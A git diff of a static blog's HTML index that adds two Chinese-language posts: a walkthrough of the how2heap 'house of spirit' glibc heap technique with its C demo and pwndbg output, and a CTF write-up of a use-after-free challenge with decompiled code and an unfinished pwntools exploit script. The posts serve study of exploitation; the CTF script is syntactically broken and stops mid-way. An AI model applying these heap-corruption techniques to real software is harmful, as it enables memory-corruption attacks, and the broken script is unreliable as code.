@@ -251,6 +251,298 @@
   
   
   <div class="post-block">
+    <link itemprop="mainEntityOfPage" href="http://yoursite.com/2019/08/17/house_of_spirit/">
+
+    <span hidden itemprop="author" itemscope itemtype="http://schema.org/Person">
+      <meta itemprop="name" content="xfgg">
+      <meta itemprop="description" content>
+      <meta itemprop="image" content="/images/avatar.gif">
+    </span>
+
+    <span hidden itemprop="publisher" itemscope itemtype="http://schema.org/Organization">
+      <meta itemprop="name" content="xfgg">
+    </span>
+
+    
+      <header class="post-header">
+
+        
+        
+          <h1 class="post-title" itemprop="name headline">
+                
+                <a class="post-title-link" href="/2019/08/17/house_of_spirit/" itemprop="url">house_of_spirit</a></h1>
+        
+
+        <div class="post-meta">
+          <span class="post-time">
+            
+              <span class="post-meta-item-icon">
+                <i class="fa fa-calendar-o"></i>
+              </span>
+              
+                <span class="post-meta-item-text">Posted on</span>
+              
+              <time title="Post created" itemprop="dateCreated datePublished" datetime="2019-08-17T16:36:15+08:00">
+                2019-08-17
+              </time>
+            
+
+            
+
+            
+          </span>
+
+          
+            <span class="post-category">
+            
+              <span class="post-meta-divider">|</span>
+            
+              <span class="post-meta-item-icon">
+                <i class="fa fa-folder-o"></i>
+              </span>
+              
+                <span class="post-meta-item-text">In</span>
+              
+              
+                <span itemprop="about" itemscope itemtype="http://schema.org/Thing">
+                  <a href="/categories/how2heap/" itemprop="url" rel="index">
+                    <span itemprop="name">how2heap</span>
+                  </a>
+                </span>
+
+                
+                
+              
+            </span>
+          
+
+          
+            
+          
+
+          
+          
+
+          
+
+          
+
+          
+
+        </div>
+      </header>
+    
+
+    
+    
+    
+    <div class="post-body" itemprop="articleBody">
+
+      
+      
+
+      
+        
+          
+            <h3 id="0x01-源代码"><a href="#0x01-源代码" class="headerlink" title="0x01 源代码"></a>0x01 源代码</h3><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;stdio.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;stdlib.h&gt;</span></span></span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">int</span> <span class="title">main</span><span class="params">()</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">	<span class="built_in">fprintf</span>(<span class="built_in">stderr</span>, <span class="string">"This file demonstrates the house of spirit attack.\n"</span>);</span><br><span class="line"></span><br><span class="line">	<span class="built_in">fprintf</span>(<span class="built_in">stderr</span>, <span class="string">"Calling malloc() once so that it sets up its memory.\n"</span>);</span><br><span class="line">	<span class="built_in">malloc</span>(<span class="number">1</span>);</span><br><span class="line"></span><br><span class="line">	<span class="built_in">fprintf</span>(<span class="built_in">stderr</span>, <span class="string">"We will now overwrite a pointer to point to a fake 'fastbin' region.\n"</span>);</span><br><span class="line">	<span class="keyword">unsigned</span> <span class="keyword">long</span> <span class="keyword">long</span> *a;</span><br><span class="line">	<span class="comment">// This has nothing to do with fastbinsY (do not be fooled by the 10) - fake_chunks is just a piece of memory to fulfil allocations (pointed to from fastbinsY)</span></span><br><span class="line">	<span class="keyword">unsigned</span> <span class="keyword">long</span> <span class="keyword">long</span> fake_chunks[<span class="number">10</span>] __attribute__ ((aligned (<span class="number">16</span>)));</span><br><span class="line"></span><br><span class="line">	<span class="built_in">fprintf</span>(<span class="built_in">stderr</span>, <span class="string">"This region (memory of length: %lu) contains two chunks. The first starts at %p and the second at %p.\n"</span>, <span class="keyword">sizeof</span>(fake_chunks), &amp;fake_chunks[<span class="number">1</span>], &amp;fake_chunks[<span class="number">9</span>]);</span><br><span class="line"></span><br><span class="line">	<span class="built_in">fprintf</span>(<span class="built_in">stderr</span>, <span class="string">"This chunk.size of this region has to be 16 more than the region (to accomodate the chunk data) while still falling into the fastbin category (&lt;= 128 on x64). The PREV_INUSE (lsb) bit is ignored by free for fastbin-sized chunks, however the IS_MMAPPED (second lsb) and NON_MAIN_ARENA (third lsb) bits cause problems.\n"</span>);</span><br><span class="line">	<span class="built_in">fprintf</span>(<span class="built_in">stderr</span>, <span class="string">"... note that this has to be the size of the next malloc request rounded to the internal size used by the malloc implementation. E.g. on x64, 0x30-0x38 will all be rounded to 0x40, so they would work for the malloc parameter at the end. \n"</span>);</span><br><span class="line">	fake_chunks[<span class="number">1</span>] = <span class="number">0x40</span>; <span class="comment">// this is the size</span></span><br><span class="line"></span><br><span class="line">	<span class="built_in">fprintf</span>(<span class="built_in">stderr</span>, <span class="string">"The chunk.size of the *next* fake region has to be sane. That is &gt; 2*SIZE_SZ (&gt; 16 on x64) &amp;&amp; &lt; av-&gt;system_mem (&lt; 128kb by default for the main arena) to pass the nextsize integrity checks. No need for fastbin size.\n"</span>);</span><br><span class="line">        <span class="comment">// fake_chunks[9] because 0x40 / sizeof(unsigned long long) = 8</span></span><br><span class="line">	fake_chunks[<span class="number">9</span>] = <span class="number">0x1234</span>; <span class="comment">// nextsize</span></span><br><span class="line"></span><br><span class="line">	<span class="built_in">fprintf</span>(<span class="built_in">stderr</span>, <span class="string">"Now we will overwrite our pointer with the address of the fake region inside the fake first chunk, %p.\n"</span>, &amp;fake_chunks[<span class="number">1</span>]);</span><br><span class="line">	<span class="built_in">fprintf</span>(<span class="built_in">stderr</span>, <span class="string">"... note that the memory address of the *region* associated with this chunk must be 16-byte aligned.\n"</span>);</span><br><span class="line">	a = &amp;fake_chunks[<span class="number">2</span>];</span><br><span class="line"></span><br><span class="line">	<span class="built_in">fprintf</span>(<span class="built_in">stderr</span>, <span class="string">"Freeing the overwritten pointer.\n"</span>);</span><br><span class="line">	<span class="built_in">free</span>(a);</span><br><span class="line"></span><br><span class="line">	<span class="built_in">fprintf</span>(<span class="built_in">stderr</span>, <span class="string">"Now the next malloc will return the region of our fake chunk at %p, which will be %p!\n"</span>, &amp;fake_chunks[<span class="number">1</span>], &amp;fake_chunks[<span class="number">2</span>]);</span><br><span class="line">	<span class="built_in">fprintf</span>(<span class="built_in">stderr</span>, <span class="string">"malloc(0x30): %p\n"</span>, <span class="built_in">malloc</span>(<span class="number">0x30</span>));</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
+
+<h3 id="0x02-思路分析"><a href="#0x02-思路分析" class="headerlink" title="0x02 思路分析"></a>0x02 思路分析</h3><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br></pre></td><td class="code"><pre><span class="line">Frees a fake fastbin chunk to get malloc to <span class="keyword">return</span> a nearly-arbitrary pointer.</span><br><span class="line"></span><br><span class="line">通过构造 fake chunk，然后将其 free 掉，就可以在下一次 malloc 时返回 fake chunk 的地址。</span><br><span class="line"></span><br><span class="line">house of spirit 通常用来配合栈溢出使用,通常场景是，栈溢出无法覆盖到的 EIP ，而恰好栈中有一个即将被 free 的堆指针。我们通过在栈上 fake 一个fastbin chunk 接着在 free 操作时，这个栈上的堆块被放到 fast bin 中，下一次 malloc 对应的大小时，由于 fast bin 的先进后出机制，这个栈上的堆块被返回给用户，再次写入时就可能造成返回地址的改写。所以利用的第一步不是去控制一个 chunk，而是控制传给 free 函数的指针，将其指向一个 fake chunk。所以 fake chunk 的伪造是关键。</span><br><span class="line"></span><br><span class="line">fake_chunks[<span class="number">1</span>] = <span class="number">0x40</span>; // this <span class="keyword">is</span> the size</span><br><span class="line"></span><br><span class="line">    fprintf(stderr, <span class="string">"The chunk.size of the *next* fake region has to be sane. That is &gt; 2*SIZE_SZ (&gt; 16 on x64) &amp;&amp; &lt; av-&gt;system_mem (&lt; 128kb by default for the main arena) to pass the nextsize integrity checks. No need for fastbin size.\n"</span>);</span><br><span class="line">        // fake_chunks[<span class="number">9</span>] because <span class="number">0x40</span> / sizeof(unsigned long long) = <span class="number">8</span></span><br><span class="line">    fake_chunks[<span class="number">9</span>] = <span class="number">0x1234</span>; // nextsize</span><br><span class="line">    </span><br><span class="line">伪造情况如下</span><br><span class="line"></span><br><span class="line">Pwndbg&gt; p fake_chunks</span><br><span class="line">$<span class="number">4</span> = &#123;<span class="number">0xc2</span>, <span class="number">0x40</span>, <span class="number">0x7fffffffe3ae</span>, <span class="number">0x7ffff7ababe5</span>, <span class="number">0x1</span>, <span class="number">0x4008ed</span>, <span class="number">0x0</span>, <span class="number">0x0</span>, <span class="number">0x4008a0</span>, <span class="number">0x1234</span>&#125;</span><br><span class="line">Pwndbg&gt; p &amp;fake_chunks</span><br><span class="line">$<span class="number">5</span> = (unsigned long long (*)[<span class="number">10</span>]) <span class="number">0x7fffffffe370</span></span><br><span class="line"></span><br><span class="line">其中 0x40 是chunk size，0x1234 是 nextsize。伪造 chunk 时需要绕过一些检查，首先是标志位，PREV_INUSE 位并不影响 free 的过程，但 IS_MMAPPED 位和 NON_MAIN_ARENA 位都要为零。其次，在 64 位系统中 fast chunk 的大小要在 32~128 字节之间。最后，是 next chunk 的大小，必须大于 2*SIZE_SZ（即大于16），小于 av-&gt;system_mem（即小于128kb），才能绕过对 next chunk 大小的检查。</span><br><span class="line"></span><br><span class="line"><span class="comment">#define PREV_INUSE 0x1</span></span><br><span class="line"><span class="comment">#define IS_MMAPPED 0x2 </span></span><br><span class="line"><span class="comment">#define NON_MAIN_ARENA 0x4</span></span><br><span class="line">size域的最低位表示 此块的上一块(表示连续内存中的上一块)是否在使 用状态, 如果此位为 <span class="number">0</span> 则表示上一块为被释放的块, 这个时候此块的 PREV_SIZE 域保存的是上一块的地 址以便在 free 此块时能够找到上一块的地址并进行 合并操作。第 <span class="number">2</span> 位表示此块是否由 mmap 分配, 如果 此位为 <span class="number">0</span> 则此块是由 top chunk 分裂得来, 否则是由 mmap 单独分配而来。第 <span class="number">3</span> 位表示此块是否不属于 main_arena, 在之后会提到main_arena是主线程用于保存堆状态的结构, 如果此位为 <span class="number">0</span> 则表示此块是在 主线程中分配的</span><br><span class="line"></span><br><span class="line">然后我们修改指针 a 指向fake chunk</span><br><span class="line"></span><br><span class="line">// fake_chunks[<span class="number">9</span>] because <span class="number">0x40</span> / sizeof(unsigned long long) = <span class="number">8</span></span><br><span class="line">      fake_chunks[<span class="number">9</span>] = <span class="number">0x1234</span>; // nextsize</span><br><span class="line">   </span><br><span class="line">      fprintf(stderr, <span class="string">"Now we will overwrite our pointer with the address of the fake region inside the fake first chunk, %p.\n"</span>, &amp;fake_chunks[<span class="number">1</span>]);</span><br><span class="line">      fprintf(stderr, <span class="string">"... note that the memory address of the *region* associated with this chunk must be 16-byte aligned.\n"</span>);</span><br><span class="line">      a = &amp;fake_chunks[<span class="number">2</span>];</span><br><span class="line">   </span><br><span class="line">      fprintf(stderr, <span class="string">"Freeing the overwritten pointer.\n"</span>);</span><br><span class="line">      free(a);</span><br><span class="line">  </span><br><span class="line">      fprintf(stderr, <span class="string">"Now the next malloc will return the region of our fake chunk at %p, which will be %p!\n"</span>, &amp;fake_chunks[<span class="number">1</span>], &amp;fake_chunks[<span class="number">2</span>]);</span><br><span class="line"></span><br><span class="line">    修改后如下：</span><br><span class="line">Pwndbg&gt; p a                                                        </span><br><span class="line">$11 = (unsigned long long *) 0x7fffffffe380--&gt; $9 = (unsigned long long **) 0x7fffffffe368</span><br><span class="line"></span><br><span class="line">成功指向了 fake chunk。当我free a的时候，系统会将 fake chunk 当做一块fastbins 处理，放到fastbins数组里。当我们再malloc的时候。我们就得到一块指向 stack 的 chunk。</span><br><span class="line"></span><br><span class="line">Pwndbg&gt; fastbins</span><br><span class="line">fastbins</span><br><span class="line"><span class="number">0x20</span>: <span class="number">0x0</span></span><br><span class="line"><span class="number">0x30</span>: <span class="number">0x0</span></span><br><span class="line"><span class="number">0x40</span>: <span class="number">0x7fffffffe370</span> ◂— <span class="number">0x0</span></span><br><span class="line"><span class="number">0x50</span>: <span class="number">0x0</span></span><br><span class="line"><span class="number">0x60</span>: <span class="number">0x0</span></span><br><span class="line"><span class="number">0x70</span>: <span class="number">0x0</span></span><br><span class="line"><span class="number">0x80</span>: <span class="number">0x0</span></span><br><span class="line">这时如果我们 malloc 一个对应大小的 fast chunk，程序将从 fastbins 中分配出这块被释放的 chunk。</span><br><span class="line">Pwndbg&gt; x/<span class="number">10</span>gx &amp;fake_chunks</span><br><span class="line"><span class="number">0x7fffffffe370</span>: <span class="number">0x00000000000000c2</span>  <span class="number">0x0000000000000040</span></span><br><span class="line"><span class="number">0x7fffffffe380</span>: <span class="number">0x0000000000000000</span>  <span class="number">0x00007ffff7ababe5</span></span><br><span class="line"><span class="number">0x7fffffffe390</span>: <span class="number">0x0000000000000001</span>  <span class="number">0x00000000004008ed</span></span><br><span class="line"><span class="number">0x7fffffffe3a0</span>: <span class="number">0x0000000000000000</span>  <span class="number">0x0000000000000000</span></span><br><span class="line"><span class="number">0x7fffffffe3b0</span>: <span class="number">0x00000000004008a0</span>  <span class="number">0x0000000000001234</span></span><br><span class="line">所以 house-of-spirit 的主要目的是，当我们伪造的 fake chunk 内部存在不可控区域时，运用这一技术可以将这片区域变成可控的。上面为了方便观察，在 fake chunk 里填充一些字母，但在现实中这些位置很可能是不可控的，而 house-of-spirit 也正是以此为目的而出现的。</span><br><span class="line"></span><br><span class="line">该技术的缺点也是需要对栈地址进行泄漏，否则无法正确覆盖需要释放的堆指针，且在构造数据时，需要满足对齐的要求等。</span><br></pre></td></tr></table></figure>
+
+
+          
+        
+      
+    </div>
+    
+    
+    
+
+    
+
+    
+
+    
+
+    <footer class="post-footer">
+      
+
+      
+
+      
+
+      
+      
+        <div class="post-eof"></div>
+      
+    </footer>
+  </div>
+  
+  
+  
+  </article>
+
+
+    
+      
+
+  
+
+  
+  
+  
+
+  <article class="post post-type-normal" itemscope itemtype="http://schema.org/Article">
+  
+  
+  
+  <div class="post-block">
+    <link itemprop="mainEntityOfPage" href="http://yoursite.com/2019/08/15/two string/">
+
+    <span hidden itemprop="author" itemscope itemtype="http://schema.org/Person">
+      <meta itemprop="name" content="xfgg">
+      <meta itemprop="description" content>
+      <meta itemprop="image" content="/images/avatar.gif">
+    </span>
+
+    <span hidden itemprop="publisher" itemscope itemtype="http://schema.org/Organization">
+      <meta itemprop="name" content="xfgg">
+    </span>
+
+    
+      <header class="post-header">
+
+        
+        
+          <h1 class="post-title" itemprop="name headline">
+                
+                <a class="post-title-link" href="/2019/08/15/two string/" itemprop="url">two string</a></h1>
+        
+
+        <div class="post-meta">
+          <span class="post-time">
+            
+              <span class="post-meta-item-icon">
+                <i class="fa fa-calendar-o"></i>
+              </span>
+              
+                <span class="post-meta-item-text">Posted on</span>
+              
+              <time title="Post created" itemprop="dateCreated datePublished" datetime="2019-08-15T20:07:48+08:00">
+                2019-08-15
+              </time>
+            
+
+            
+
+            
+          </span>
+
+          
+            <span class="post-category">
+            
+              <span class="post-meta-divider">|</span>
+            
+              <span class="post-meta-item-icon">
+                <i class="fa fa-folder-o"></i>
+              </span>
+              
+                <span class="post-meta-item-text">In</span>
+              
+              
+                <span itemprop="about" itemscope itemtype="http://schema.org/Thing">
+                  <a href="/categories/网络信息安全专项赛/" itemprop="url" rel="index">
+                    <span itemprop="name">网络信息安全专项赛</span>
+                  </a>
+                </span>
+
+                
+                
+              
+            </span>
+          
+
+          
+            
+          
+
+          
+          
+
+          
+
+          
+
+          
+
+        </div>
+      </header>
+    
+
+    
+    
+    
+    <div class="post-body" itemprop="articleBody">
+
+      
+      
+
+      
+        
+          
+            <h3 id="0x01-寻找漏洞"><a href="#0x01-寻找漏洞" class="headerlink" title="0x01 寻找漏洞"></a>0x01 寻找漏洞</h3><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br></pre></td><td class="code"><pre><span class="line">RELRO           STACK CANARY      NX            PIE         </span><br><span class="line">Partial RELRO   Canary found      NX enabled    No PIE</span><br><span class="line"></span><br><span class="line">具体步骤在uaf实例 差不多的题目这里直接简单解题</span><br><span class="line"></span><br><span class="line">漏洞函数</span><br><span class="line"></span><br><span class="line">int sub_E56()</span><br><span class="line">&#123;</span><br><span class="line">  int v1; // [rsp+Ch] [rbp<span class="number">-4</span>h]</span><br><span class="line"></span><br><span class="line">  printf(<span class="string">"Please input index : "</span>);</span><br><span class="line">  v1 = sub_BE4();</span><br><span class="line">  <span class="keyword">if</span> ( v1 &lt; <span class="number">0</span> &amp;&amp; (unsigned int)v1 &gt; <span class="number">0x1F</span> || !qword_202040[v1] )</span><br><span class="line">    <span class="keyword">return</span> puts(<span class="string">"Index error!"</span>);</span><br><span class="line">  free((void *)*qword_202040[v1]);</span><br><span class="line">  free(qword_202040[v1]);</span><br><span class="line">  qword_202040[v1] = <span class="number">0L</span>L;</span><br><span class="line">  <span class="keyword">return</span> puts(<span class="string">"Delete success!"</span>);</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">uaf漏洞</span><br><span class="line"></span><br><span class="line">xfgg@ubuntu:~/Desktop$ ./pwn</span><br><span class="line"><span class="number">1.</span> create string</span><br><span class="line"><span class="number">2.</span> display string</span><br><span class="line"><span class="number">3.</span> delete string</span><br><span class="line"><span class="number">4.</span> merge string</span><br><span class="line"><span class="number">5.</span> merge strings</span><br><span class="line"><span class="number">6.</span> exit</span><br><span class="line"><span class="meta">&gt;&gt;&gt; </span><span class="number">1</span></span><br><span class="line">Please enter the size of string : <span class="number">2</span></span><br><span class="line">Please enter the string : <span class="number">1</span></span><br><span class="line">    </span><br><span class="line">    create string 的结构</span><br><span class="line">    struct palyer&#123;</span><br><span class="line">    int size；</span><br><span class="line">    int string；</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
+
+<h3 id="0x02-思路分析"><a href="#0x02-思路分析" class="headerlink" title="0x02 思路分析"></a>0x02 思路分析</h3><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br></pre></td><td class="code"><pre><span class="line">编写dynelf查看内存结构</span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">create_string</span><span class="params">(size,string)</span></span></span><br><span class="line"><span class="function">	<span class="title">p</span>.<span class="title">recvuntil</span><span class="params">(<span class="string">" "</span>)</span></span></span><br><span class="line"><span class="function">    <span class="title">p</span>.<span class="title">sendline</span><span class="params">(<span class="string">"1"</span>)</span></span></span><br><span class="line"><span class="function">	<span class="title">p</span>.<span class="title">recvuntil</span>（' <span class="title">of</span> <span class="title">string</span>：'）</span></span><br><span class="line"><span class="function">	<span class="title">p</span>.<span class="title">sendline</span>（<span class="title">str</span><span class="params">(size)</span>）</span></span><br><span class="line"><span class="function">	<span class="title">p</span>.<span class="title">recvuntil</span>（' <span class="title">the</span> <span class="title">string</span>：'）</span></span><br><span class="line"><span class="function">	<span class="title">p</span>.<span class="title">sendline</span> <span class="params">(string)</span></span></span><br><span class="line"><span class="function">	</span></span><br><span class="line"><span class="function"><span class="title">def</span> <span class="title">display_string</span><span class="params">(index)</span></span></span><br><span class="line"><span class="function">	<span class="title">p</span>.<span class="title">recvuntil</span><span class="params">(<span class="string">" "</span>)</span></span></span><br><span class="line"><span class="function">    <span class="title">p</span>.<span class="title">sendline</span><span class="params">(<span class="string">"2"</span>)</span></span></span><br><span class="line"><span class="function">	<span class="title">p</span>.<span class="title">recvuntil</span>（' <span class="title">index</span>：'）</span></span><br><span class="line"><span class="function">	<span class="title">p</span>.<span class="title">sendline</span><span class="params">(str<span class="params">(index)</span>)</span></span></span><br><span class="line"><span class="function">    </span></span><br><span class="line"><span class="function"><span class="title">def</span> <span class="title">delete_string</span><span class="params">(index)</span></span></span><br><span class="line"><span class="function">	<span class="title">p</span>.<span class="title">recvuntil</span><span class="params">(<span class="string">" "</span>)</span></span></span><br><span class="line"><span class="function">    <span class="title">p</span>.<span class="title">sendline</span><span class="params">(<span class="string">"3"</span>)</span></span></span><br><span class="line"><span class="function">	<span class="title">p</span>.<span class="title">recvuntil</span>（' <span class="title">index</span>：'）</span></span><br><span class="line"><span class="function">	<span class="title">p</span>.<span class="title">sendline</span><span class="params">(str<span class="params">(index)</span>)</span></span></span><br><span class="line"><span class="function"></span></span><br><span class="line"><span class="function"><span class="title">create_string</span><span class="params">(<span class="number">32</span>,<span class="string">'aaa'</span>)</span></span></span><br><span class="line"><span class="function"><span class="title">create_string</span><span class="params">(<span class="number">32</span>,<span class="string">'bbb'</span>)</span></span></span><br><span class="line"><span class="function"></span></span><br><span class="line"><span class="function"><span class="title">delete</span><span class="params">(<span class="number">1</span>)</span></span></span><br><span class="line"><span class="function"><span class="title">delete</span><span class="params">(<span class="number">0</span>)</span> ### <span class="title">free</span>掉创建的两个<span class="title">string</span> 接下来就要构造<span class="title">fake</span> <span class="title">chunk</span>进行攻击</span></span><br></pre></td></tr></table></figure>
+
+<h3 id="0x03-exp"><a href="#0x03-exp" class="headerlink" title="0x03 exp"></a>0x03 exp</h3><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">from</span> pwn <span class="keyword">import</span> *</span><br><span class="line">p = process(<span class="string">'/home/xfgg/pwn'</span>)</span><br><span class="line">elf = ELF(<span class="string">'/home/xfgg/pwn'</span>)</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">create_string</span><span class="params">(size,string)</span></span></span><br><span class="line"><span class="function">	<span class="title">p</span>.<span class="title">recvuntil</span><span class="params">(<span class="string">" "</span>)</span></span></span><br><span class="line"><span class="function">    <span class="title">p</span>.<span class="title">sendline</span><span class="params">(<span class="string">"1"</span>)</span></span></span><br><span class="line"><span class="function">	<span class="title">p</span>.<span class="title">recvuntil</span>（' <span class="title">of</span> <span class="title">string</span>：'）</span></span><br><span class="line"><span class="function">	<span class="title">p</span>.<span class="title">sendline</span>（<span class="title">str</span><span class="params">(size)</span>）</span></span><br><span class="line"><span class="function">	<span class="title">p</span>.<span class="title">recvuntil</span>（' <span class="title">the</span> <span class="title">string</span>：'）</span></span><br><span class="line"><span class="function">	<span class="title">p</span>.<span class="title">sendline</span> <span class="params">(string)</span></span></span><br><span class="line"><span class="function">	</span></span><br><span class="line"><span class="function"><span class="title">def</span> <span class="title">display_string</span><span class="params">(index)</span></span></span><br><span class="line"><span class="function">	<span class="title">p</span>.<span class="title">recvuntil</span><span class="params">(<span class="string">" "</span>)</span></span></span><br><span class="line"><span class="function">    <span class="title">p</span>.<span class="title">sendline</span><span class="params">(<span class="string">"2"</span>)</span></span></span><br><span class="line"><span class="function">	<span class="title">p</span>.<span class="title">recvuntil</span>（' <span class="title">index</span>：'）</span></span><br><span class="line"><span class="function">	<span class="title">p</span>.<span class="title">sendline</span><span class="params">(str<span class="params">(index)</span>)</span></span></span><br><span class="line"><span class="function">    </span></span><br><span class="line"><span class="function"><span class="title">def</span> <span class="title">delete_string</span><span class="params">(index)</span></span></span><br><span class="line"><span class="function">	<span class="title">p</span>.<span class="title">recvuntil</span><span class="params">(<span class="string">" "</span>)</span></span></span><br><span class="line"><span class="function">    <span class="title">p</span>.<span class="title">sendline</span><span class="params">(<span class="string">"3"</span>)</span></span></span><br><span class="line"><span class="function">	<span class="title">p</span>.<span class="title">recvuntil</span>（' <span class="title">index</span>：'）</span></span><br><span class="line"><span class="function">	<span class="title">p</span>.<span class="title">sendline</span><span class="params">(str<span class="params">(index)</span>)</span></span></span><br><span class="line"><span class="function"></span></span><br><span class="line"><span class="function"><span class="title">create_string</span><span class="params">(<span class="number">32</span>,<span class="string">'aaa'</span>)</span></span></span><br><span class="line"><span class="function"><span class="title">create_string</span><span class="params">(<span class="number">32</span>,<span class="string">'bbb'</span>)</span></span></span><br><span class="line"><span class="function"></span></span><br><span class="line"><span class="function"><span class="title">delete</span><span class="params">(<span class="number">1</span>)</span></span></span><br><span class="line"><span class="function"><span class="title">delete</span><span class="params">(<span class="number">0</span>)</span></span></span><br><span class="line"><span class="function"></span></span><br><span class="line"><span class="function"><span class="title">magic</span></span></span><br></pre></td></tr></table></figure>
+
+
+          
+        
+      
+    </div>
+    
+    
+    
+
+    
+
+    
+
+    
+
+    <footer class="post-footer">
+      
+
+      
+
+      
+
+      
+      
+        <div class="post-eof"></div>
+      
+    </footer>
+  </div>
+  
+  
+  
+  </article>
+
+
+    
+      
+
+  
+
+  
+  
+  
+
+  <article class="post post-type-normal" itemscope itemtype="http://schema.org/Article">
+  
+  
+  
+  <div class="post-block">
     <link itemprop="mainEntityOfPage" href="http://yoursite.com/2019/08/12/unsafe unlink/">
 
     <span hidden itemprop="author" itemscope itemtype="http://schema.org/Person">
@@ -1422,297 +1714,6 @@
 
 
     
-      
-
-  
-
-  
-  
-  
-
-  <article class="post post-type-normal" itemscope itemtype="http://schema.org/Article">
-  
-  
-  
-  <div class="post-block">
-    <link itemprop="mainEntityOfPage" href="http://yoursite.com/2019/08/02/fastbin_dup/">
-
-    <span hidden itemprop="author" itemscope itemtype="http://schema.org/Person">
-      <meta itemprop="name" content="xfgg">
-      <meta itemprop="description" content>
-      <meta itemprop="image" content="/images/avatar.gif">
-    </span>
-
-    <span hidden itemprop="publisher" itemscope itemtype="http://schema.org/Organization">
-      <meta itemprop="name" content="xfgg">
-    </span>
-
-    
-      <header class="post-header">
-
-        
-        
-          <h1 class="post-title" itemprop="name headline">
-                
-                <a class="post-title-link" href="/2019/08/02/fastbin_dup/" itemprop="url">fastbin_dup</a></h1>
-        
-
-        <div class="post-meta">
-          <span class="post-time">
-            
-              <span class="post-meta-item-icon">
-                <i class="fa fa-calendar-o"></i>
-              </span>
-              
-                <span class="post-meta-item-text">Posted on</span>
-              
-              <time title="Post created" itemprop="dateCreated datePublished" datetime="2019-08-02T11:42:03+08:00">
-                2019-08-02
-              </time>
